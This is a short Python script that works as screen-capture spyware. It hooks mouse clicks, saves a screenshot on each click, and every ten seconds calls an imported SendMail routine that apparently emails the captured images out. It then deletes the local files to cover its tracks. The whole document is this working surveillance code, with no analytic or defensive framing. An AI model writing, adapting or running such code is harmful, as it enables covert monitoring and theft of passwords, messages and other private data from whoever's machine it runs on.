import os
import pyscreenshot
import threading
from time import sleep
from pynput.mouse import Listener as MouseListener
from mailLogger import SendMail  # Assuming SendMail is a function defined in mailLogger module

# Global variables
path = './screenshot/'
interval = 10
image_number = 0

# Create the screenshot directory if it doesn't exist
if not os.path.isdir(path):
    os.mkdir(path)

# Function to take a screenshot
def take_screenshot():
    global path, image_number
    image = pyscreenshot.grab()
    file_path = f"{path}Screenshoot_{image_number}.png"
    image.save(file_path)
    image_number += 1

# Function to clean the directory
def clean_directory():
    global path
    for file in os.listdir(path):
        os.remove(os.path.join(path, file))
    print('Files cleaned...')

# Function to handle mouse click event
def on_click(x, y, button, pressed):
    if pressed:
        take_screenshot()
        print('Screenshot taken')

# Function to send report via email, clean directory, and schedule next report
def report():
    global interval, path
    SendMail()  # Assuming SendMail function sends an email with attached screenshots
    print('Mail sent')
    clean_directory()
    threading.Timer(interval, report).start()

# Start the mouse listener
with MouseListener(on_click=on_click) as listener:
    # Start reporting function
    report()
    listener.join()
